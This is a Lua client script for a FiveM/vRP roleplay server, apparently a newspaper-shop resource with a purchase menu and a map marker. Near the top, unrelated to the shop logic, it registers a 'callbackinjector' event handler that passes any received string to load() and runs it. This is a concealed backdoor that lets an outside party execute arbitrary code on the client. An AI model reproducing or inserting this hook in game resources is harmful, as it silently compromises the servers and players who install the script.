local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_jornal")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "itensjornal-comprar-jornal" then
		TriggerServerEvent("jornal-comprar","jornal")
	elseif data == "itensjornal-comprar-carteiraimprensa" then
		TriggerServerEvent("jornal-comprar","carteiraimprensa")
	elseif data == "jornal-vender-cheque" then
		TriggerServerEvent("jornal-vender","cheque")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local marcacoes = {
	{ -563.39300537109,-919.13165283203,23.877767562866 },
}

Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		for _,mark in pairs(marcacoes) do
			local x,y,z = table.unpack(mark)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			if distance <= 1.2 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(nyoSleep)
	end
end)